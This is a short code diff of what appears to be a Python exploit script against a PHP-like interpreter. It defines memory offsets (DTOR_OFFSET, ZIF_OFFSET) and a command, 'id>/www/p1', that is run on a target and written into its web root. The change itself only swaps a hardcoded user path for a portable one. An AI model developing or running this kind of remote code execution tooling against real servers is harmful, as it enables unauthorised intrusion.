@@ -4,6 +4,7 @@
 S = chunk_base + offset.  8.4.26 uses 0xF8398.  Scan a window around it
 and a wider range to find the 8.3.35 value.
 """
+import os
 import subprocess, sys, os, time, struct, socket, re, urllib.parse
 from collections import Counter
 
@@ -13,7 +14,7 @@ DTOR_OFFSET = 0x49ec50
 ZIF_OFFSET = 0x3ac080
 CMD = "id>/www/p1"
 FETCH = "/p1"
-GH = r"C:\Users\likat\.qwen\tmp\p2s"
+GH = os.path.join(os.path.expanduser("~"), ".qwen", "tmp", "p2s")
 HERE = os.path.dirname(os.path.abspath(__file__))
 TMP = os.path.join(HERE, "tmp_8335")
 
